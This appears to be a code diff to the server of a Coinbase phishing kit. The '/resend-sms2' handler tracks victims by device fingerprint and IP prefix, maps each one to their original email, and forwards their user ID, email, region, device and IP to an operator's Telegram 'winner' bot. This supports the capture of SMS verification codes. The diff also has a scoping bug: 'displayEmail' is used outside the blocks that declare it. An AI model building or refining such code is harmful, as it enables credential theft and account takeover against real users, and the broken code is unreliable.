@@ -849,39 +849,59 @@ app.post("/resend-sms2", async (req, res) => {
     const fingerprint = getDeviceFingerprint(req);
     const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
-    // ✅ Get email from fingerprint or IP
-    let email = "unknown@example.com";
+    // ✅ Get ORIGINAL email (not displayEmail) for winner lookup
+    let originalEmail = "unknown@example.com";
     
-    if (sms2Id && pendingSMS2[sms2Id]) {
-      email = pendingSMS2[sms2Id].email || pendingSMS2[sms2Id].displayEmail || "unknown@example.com";
-      console.log(`✅ Found email in pendingSMS2: ${email}`);
-    } else if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      email = deviceFingerprintToEmail[fingerprint];
-      console.log(`✅ Found email via fingerprint: ${email}`);
+    // Try to find original email from reverse mapping
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      const displayEmail = deviceFingerprintToEmail[fingerprint];
+      // Search pendingPage to find original email with this displayEmail
+      for (const [origEmail, data] of Object.entries(pendingPage)) {
+        if (data.displayEmail === displayEmail) {
+          originalEmail = origEmail;
+          break;
+        }
+      }
+      // If not found in pendingPage, search pendingSMS
+      if (originalEmail === "unknown@example.com") {
+        for (const [origEmail, data] of Object.entries(pendingSMS)) {
+          if (data.displayEmail === displayEmail) {
+            originalEmail = origEmail;
+            break;
+          }
+        }
+      }
+      console.log(`✅ Mapped displayEmail ${displayEmail} to originalEmail ${originalEmail}`);
     } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
-      email = ipPrefixToEmail[ipPrefix];
-      console.log(`✅ Found email via IP: ${email}`);
+      const displayEmail = ipPrefixToEmail[ipPrefix];
+      for (const [origEmail, data] of Object.entries(pendingPage)) {
+        if (data.displayEmail === displayEmail) {
+          originalEmail = origEmail;
+          break;
+        }
+      }
+      console.log(`✅ Mapped displayEmail ${displayEmail} to originalEmail ${originalEmail}`);
     }
 
     const message =
       `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    console.log(`🔍 DEBUG: userWinnerTelegram[${email}] = ${userWinnerTelegram[email]}`);
+    console.log(`🔍 DEBUG: userWinnerTelegram[${originalEmail}] = ${userWinnerTelegram[originalEmail]}`);
 
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      console.log(`✅ Sending resend SMS 2 message to winner bot for ${email}`);
-      await sendFollowUpMessage(email, message, {
+    // ✅ SEND TO WINNER using ORIGINAL email
+    if (originalEmail && userWinnerTelegram[originalEmail]) {
+      console.log(`✅ Sending resend SMS 2 to winner for ${originalEmail}`);
+      await sendFollowUpMessage(originalEmail, message, {
         parse_mode: "HTML"
       });
       console.log(`✅ Message sent!`);
     } else {
-      console.log(`❌ No winner for ${email}`);
+      console.log(`❌ No winner for ${originalEmail}`);
       return res.status(400).json({ error: "No winner determined for this email" });
     }
 
